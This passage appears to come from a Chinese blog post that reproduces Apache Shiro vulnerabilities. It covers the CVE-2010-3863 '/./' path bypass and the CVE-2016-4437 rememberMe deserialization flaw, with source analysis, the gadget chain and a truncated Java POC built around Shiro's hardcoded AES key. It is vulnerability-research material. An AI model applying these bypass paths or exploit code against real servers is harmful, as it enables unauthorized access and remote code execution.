+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.shiro.subject.Subject<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.stereotype.Service<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@Service
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">UserServiceImpl</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">checkLogin</span><span style="color:#ff79c6">(</span>String username<span style="color:#ff79c6">,</span> String password<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        Subject subject <span style="color:#ff79c6">=</span> SecurityUtils<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getSubject</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        UsernamePasswordToken token <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> UsernamePasswordToken<span style="color:#ff79c6">(</span>username<span style="color:#ff79c6">,</span> password<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        subject<span style="color:#ff79c6">.</span><span style="color:#50fa7b">login</span><span style="color:#ff79c6">(</span>token<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><p>接下来的漏洞复现基本就基于这个小项目</p>
+<h2 id="cve-2010-3863">CVE-2010-3863</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">漏洞信息</th>
+<th style="text-align:left">详情</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">漏洞编号</td>
+<td style="text-align:left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863">CVE-2010-3863</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2010-2715">CNVD-2010-2715</a></td>
+</tr>
+<tr>
+<td style="text-align:left">影响版本</td>
+<td style="text-align:left">shiro &lt; 1.1.0 &amp; JSecurity 0.9.x</td>
+</tr>
+<tr>
+<td style="text-align:left">漏洞描述</td>
+<td style="text-align:left">Shiro 在对请求路径与 shiro.ini 配置文件配置的 AntPath 进行对比前 未进行路径标准化，导致使用时可能绕过权限校验</td>
+</tr>
+<tr>
+<td style="text-align:left">漏洞关键字</td>
+<td style="text-align:left">/./ | 路径标准化</td>
+</tr>
+<tr>
+<td style="text-align:left">漏洞补丁</td>
+<td style="text-align:left"><a href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34">Commit-ab82949</a></td>
+</tr>
+<tr>
+<td style="text-align:left">相关链接</td>
+<td style="text-align:left"><a href="https://vulners.com/nessus/SHIRO_SLASHDOT_BYPASS.NASL">https://vulners.com/nessus/SHIRO_SLASHDOT_BYPASS.NASL</a> <a href="https://marc.info/?l=bugtraq&amp;m=128880520013694&amp;w=2">https://marc.info/?l=bugtraq&amp;m=128880520013694&amp;w=2</a></td>
+</tr>
+</tbody>
+</table>
+<h3 id="复现">复现</h3>
+<p>如上面的环境所示，访问 <code>secret.html</code> 被重定向，访问 <code>/./secret.html</code> 绕过了鉴权。</p>
+<p>filter 设置如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        filterMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/secret.html/**&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;authc,roles[admin_role]&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        filterMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/secret/**&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;authc,roles[admin_role]&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        filterMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/**&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;anon&#34;</span><span style="color:#ff79c6">);</span>
+</span></span></code></pre></div><p>特点是 <code>/**</code> 匹配了所有匿名 filter</p>
+<p><img src="https://s2.loli.net/2022/10/22/vFPafOMopdKzXyx.png" alt="image-20221017170930471"></p>
+<p><img src="https://s2.loli.net/2022/10/22/MWQGSLF5wh8mxcJ.png" alt="image-20221017170939523"></p>
+<h3 id="分析">分析</h3>
+<p>在请求访问到达 ShiroFilter 后，会根据 request 的信息，调用 <code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code> 方法匹配配置的 pathPattern 以及 requestURI，如果有匹配，则会添加一层 ProxiedFilterChain 代理。这里看到，如果 <code>pathMatches</code> 方法匹配，将会进行 return，因此配置的顺序也很重要。</p>
+<p>getChain方法的逻辑是：循环匹配所有 pattern 和 URI ，如果匹配则添加 ProxiedFilterChain  代理。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> FilterChain <span style="color:#50fa7b">getChain</span><span style="color:#ff79c6">(</span>ServletRequest request<span style="color:#ff79c6">,</span> ServletResponse response<span style="color:#ff79c6">,</span> FilterChain originalChain<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    FilterChainManager filterChainManager <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getFilterChainManager</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(!</span>filterChainManager<span style="color:#ff79c6">.</span><span style="color:#50fa7b">hasChains</span><span style="color:#ff79c6">())</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        String requestURI <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getPathWithinApplication</span><span style="color:#ff79c6">(</span>request<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        Iterator i$ <span style="color:#ff79c6">=</span> filterChainManager<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getChainNames</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">iterator</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        String pathPattern<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">do</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(!</span>i$<span style="color:#ff79c6">.</span><span style="color:#50fa7b">hasNext</span><span style="color:#ff79c6">())</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            pathPattern <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">)</span>i$<span style="color:#ff79c6">.</span><span style="color:#50fa7b">next</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">while</span><span style="color:#ff79c6">(!</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">pathMatches</span><span style="color:#ff79c6">(</span>pathPattern<span style="color:#ff79c6">,</span> requestURI<span style="color:#ff79c6">));</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>log<span style="color:#ff79c6">.</span><span style="color:#50fa7b">isTraceEnabled</span><span style="color:#ff79c6">())</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            log<span style="color:#ff79c6">.</span><span style="color:#50fa7b">trace</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Matched path pattern [&#34;</span> <span style="color:#ff79c6">+</span> pathPattern <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;] for requestURI [&#34;</span> <span style="color:#ff79c6">+</span> requestURI <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;].  &#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;Utilizing corresponding filter chain...&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> filterChainManager<span style="color:#ff79c6">.</span><span style="color:#50fa7b">proxy</span><span style="color:#ff79c6">(</span>originalChain<span style="color:#ff79c6">,</span> pathPattern<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><p>动调跟进 pathMatches 方法，发现 shiro 对于用户输入 path 没有任何过滤。来到 <code>org.apache.shiro.util#doMatch</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">protected</span> <span style="color:#8be9fd">boolean</span> <span style="color:#50fa7b">doMatch</span><span style="color:#ff79c6">(</span>String pattern<span style="color:#ff79c6">,</span> String path<span style="color:#ff79c6">,</span> <span style="color:#8be9fd">boolean</span> fullMatch<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>path<span style="color:#ff79c6">.</span><span style="color:#50fa7b">startsWith</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">pathSeparator</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">!=</span> pattern<span style="color:#ff79c6">.</span><span style="color:#50fa7b">startsWith</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">pathSeparator</span><span style="color:#ff79c6">))</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        String<span style="color:#ff79c6">[]</span> pattDirs <span style="color:#ff79c6">=</span> StringUtils<span style="color:#ff79c6">.</span><span style="color:#50fa7b">tokenizeToStringArray</span><span style="color:#ff79c6">(</span>pattern<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">pathSeparator</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        String<span style="color:#ff79c6">[]</span> pathDirs <span style="color:#ff79c6">=</span> StringUtils<span style="color:#ff79c6">.</span><span style="color:#50fa7b">tokenizeToStringArray</span><span style="color:#ff79c6">(</span>path<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">pathSeparator</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> pattIdxStart <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> pattIdxEnd <span style="color:#ff79c6">=</span> pattDirs<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span> <span style="color:#ff79c6">-</span> 1<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> pathIdxStart <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> pathIdxEnd<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>        String patDir<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span><span style="color:#ff79c6">(</span>pathIdxEnd <span style="color:#ff79c6">=</span> pathDirs<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span> <span style="color:#ff79c6">-</span> 1<span style="color:#ff79c6">;</span> pattIdxStart <span style="color:#ff79c6">&lt;=</span> pattIdxEnd <span style="color:#ff79c6">&amp;&amp;</span> pathIdxStart <span style="color:#ff79c6">&lt;=</span> pathIdxEnd<span style="color:#ff79c6">;</span> <span style="color:#ff79c6">++</span>pathIdxStart<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            patDir <span style="color:#ff79c6">=</span> pattDirs<span style="color:#ff79c6">[</span>pattIdxStart<span style="color:#ff79c6">];</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;**&#34;</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">equals</span><span style="color:#ff79c6">(</span>patDir<span style="color:#ff79c6">))</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">break</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(!</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">matchStrings</span><span style="color:#ff79c6">(</span>patDir<span style="color:#ff79c6">,</span> pathDirs<span style="color:#ff79c6">[</span>pathIdxStart<span style="color:#ff79c6">]))</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">++</span>pattIdxStart<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">......</span>
+</span></span></code></pre></div><p>如果构造 <code>/./secret.html</code> ，那么第一次 matchStrings 就会比较 <code>/secret.html</code> 和 <code>.</code> ，返回 false 未匹配。第二次则是 <code>/**</code> ，直接返回 true 匹配成功。如下</p>
+<p><img src="https://s2.loli.net/2022/10/22/AI3rugxSBvkzp2J.png" alt="image-20221017172839824"></p>
+<p><img src="https://s2.loli.net/2022/10/22/wgnG6RfethAVvUx.png" alt="image-20221017172859736"></p>
+<h3 id="进一步思考----springboot-路由">进一步思考 &ndash; springboot 路由</h3>
+<p>上述的复现是访问 static 下的 html，但是经过测试，这对于springboot路由并不适用，这是因为springboot没有将<code>.</code>解析。 直接访问会导致 404</p>
+<p><img src="https://s2.loli.net/2022/10/22/s3VSePfoFgl1LGT.png" alt="image-20221017173935181"></p>
+<p>但是，当springboot版本&lt;=2.3.0.RELEASE的时候，<code>alwaysUseFullPath</code>为默认值false，这会使得其获取ServletPath，所以在路由匹配时相当于会进行路径标准化包括对<code>%2e</code>解码以及处理跨目录，这可能导致身份验证绕过。关于这方面的trick可以参考 <a href="https://cloud.tencent.com/developer/article/1832473">https://cloud.tencent.com/developer/article/1832473</a></p>
+<p>把pom的springboot version依赖改成这个</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;version&gt;</span>2.3.0.RELEASE<span style="color:#ff79c6">&lt;/version&gt;</span>
+</span></span></code></pre></div><p>成功绕过鉴权</p>
+<p><img src="https://s2.loli.net/2022/10/22/HeZTIXaEA3wolRM.png" alt="image-20221017173318187"></p>
+<h3 id="修复">修复</h3>
+<p>Shiro 在 <a href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34">ab82949</a> 更新中添加了标准化路径函数，把 /./ 等进行了循环制空</p>
+<h2 id="cve-2016-4437shiro550">CVE-2016-4437	(shiro550)</h2>
+<p>大名鼎鼎的rememberMe反序列化</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">漏洞信息</th>
+<th style="text-align:left">详情</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">漏洞编号</td>
+<td style="text-align:left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0074">CVE-2016-4437</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2016-03869">CNVD-2016-03869</a> / <a href="https://issues.apache.org/jira/browse/SHIRO-550">SHIRO-550</a></td>
+</tr>
+<tr>
+<td style="text-align:left">影响版本</td>
+<td style="text-align:left">shiro 1.x &lt; 1.2.5</td>
+</tr>
+<tr>
+<td style="text-align:left">漏洞描述</td>
+<td style="text-align:left">如果程序未能正确配置 “remember me” 功能使用的密钥。 攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。</td>
+</tr>
+<tr>
+<td style="text-align:left">漏洞关键字</td>
+<td style="text-align:left">cookie | RememberMe | 反序列化 | 硬编码 | AES</td>
+</tr>
+<tr>
+<td style="text-align:left">漏洞补丁</td>
+<td style="text-align:left"><a href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">Commit-4d5bb00</a></td>
+</tr>
+<tr>
+<td style="text-align:left">相关链接</td>
+<td style="text-align:left"><a href="https://issues.apache.org/jira/browse/SHIRO-441">SHIRO-441</a> <a href="https://www.anquanke.com/post/id/192619">https://www.anquanke.com/post/id/192619</a></td>
+</tr>
+</tbody>
+</table>
+<h3 id="脚本小子">脚本小子</h3>
+<p>首先将shiro依赖换成1.2.4（不知道为什么1.0.0没有复现成功）</p>
+<p>使用一个比较稳定的工具</p>
+<p><a href="https://github.com/safe6Sec/ShiroExp">https://github.com/safe6Sec/ShiroExp</a></p>
+<p>无脑梭哈，但是内存马似乎有点问题？</p>
+<p><img src="https://s2.loli.net/2022/10/22/7Gqf9xJ3n2ICyc6.png" alt="image-20221017222436693"></p>
+<h3 id="漏洞分析">漏洞分析</h3>
+<p>调试过程略，直接给出调用链</p>
+<pre tabindex="0"><code>AbstractShiroFilter.doFilterInternal() 
+    AbstractShiroFilter.createSubject()
+        WebSubject.Builder.buildWebSubject()
+            Subject.Builder.buildSubject()
+                DefaultSecurityManager.createSubject()
+                    DefaultSecurityManager.resolvePrincipals()
+                        DefaultSecurityManager.getRememberedIdentity()
+                            AbstractRememberMeManager.getRememberedPrincipals()
+</code></pre><p>最后反序列化的点在 <code>org.apache.shiro.io.DefaultSerializer#deserialize</code></p>
+<p><img src="https://s2.loli.net/2022/10/22/ARkyxrC4OHnlqUa.png" alt="image-20221018142628447"></p>
+<p>需要注意的是，由于Tomcat和JDK的ClassPath不一样，这里的loadClass无法加载除了jdk以外的第三方库的数组。所以这导致CommonsCollections链中的ChainedTransformer无法使用。解决方法主要有以下几个</p>
+<ul>
+<li>用JRMP链把被攻击服务器变成客户端再进行后续利用</li>
+<li>改造 CC 链，组合 InvokerTransformer 与 TemplatesImpl，避免使用 Transformer 数组。</li>
+<li>commons-beanutils 无依赖反序列化</li>
+</ul>
+<p>接下来调试一下无依赖commons-beanutils链</p>
+<p>这条链的后半部分和cc2链子的<code>TemplatesImpl#getOutputProperties()</code>是一样的。其前半部分的关键在于commons-beanutils库提供的静态方法<code>PropertyUtils.getProperty</code>。例如，<code>PropertyUtils.getProperty(new Cat(), &quot;name&quot;);</code>会调用Cat类的getName()方法</p>
+<p>而在<code>org.apache.commons.beanutils.BeanComparator#compare</code>中会调用这方法</p>
+<p><img src="https://s2.loli.net/2022/10/22/ryiUdjmsKSDXg2V.png" alt="image-20221018220956365"></p>
+<p>众所周知CC2链的PriorityQueue在反序列化的时候可以调用指定Comparator的compare方法。于是乎直接拼上CC2链</p>
+<p>然而直接拼会发现报错，这是因为BeanComparator调用构造器时会引入shiro中不存在的类<code>org.apache.commons.collections.comparators.ComparableComparator</code></p>
+<p>于是乎，需要找一个jdk自带的Comparator，其满足以下条件</p>
+<ol>
+<li>实现Serializable</li>
+<li>实现Comparator</li>
+</ol>
+<p>用codeql跑一下</p>
+<pre tabindex="0"><code class="language-ql" data-lang="ql">import java
+
+from Class c
+where c.getASourceSupertype().hasQualifiedName(&#34;java.util&#34;,&#34;Comparator&#34;)
+    and
+    c.getASupertype*() instanceof TypeSerializable
+select c
+</code></pre><p><img src="https://s2.loli.net/2022/10/22/Z3SgltcVLud5FQR.png" alt="image-20221018221516633"></p>
+<p>我选择了NullComparator</p>
+<p>在写POC的时候还有一个小坑，shiro的rememberMe字段的组成为</p>
+<p><code>base64_ciphertext = base64.b64encode(iv+encrypt(serializedBytes))</code></p>
+<p>POC如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> cb<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.media.sound.ModelInstrumentComparator<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassPool<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.*<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.AccessibleObject<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Constructor<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Field<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.InvocationTargetException<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.nio.charset.StandardCharsets<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Comparator<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.PriorityQueue<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.beanutils.BeanComparator<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.tomcat.util.codec.binary.Base64<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.util.comparator.Comparators<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sun.reflect.ReflectionFactory<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.crypto.Cipher<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.crypto.spec.IvParameterSpec<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.crypto.spec.SecretKeySpec<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Poc</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd;font-style:italic">final</span> String key <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd;font-style:italic">final</span> String initVector <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;encryptionIntVec&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        PriorityQueue queue<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> PriorityQueue<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>1<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>2<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        Comparator nullComparator<span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>Comparator<span style="color:#ff79c6">)</span> createWithoutConstructor<span style="color:#ff79c6">(</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;java.util.Comparators$NullComparator&#34;</span><span style="color:#ff79c6">));</span>
+</span></span><span style="display:flex;"><span>        BeanComparator beanComparator<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> BeanComparator<span style="color:#ff79c6">(</span><span style="color:#ff79c6">null</span><span style="color:#ff79c6">,</span>nullComparator<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        beanComparator<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setProperty</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;outputProperties&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>queue<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;comparator&#34;</span><span style="color:#ff79c6">,</span>beanComparator<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>queue<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;queue&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]{</span>getTemplates<span style="color:#ff79c6">(),</span>2<span style="color:#ff79c6">});</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b<span style="color:#ff79c6">=</span>serialize<span style="color:#ff79c6">(</span>queue<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span>byte2base<span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">,</span>initVector<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getBytes</span><span style="color:#ff79c6">(</span>StandardCharsets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">UTF_8</span><span style="color:#ff79c6">)));</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
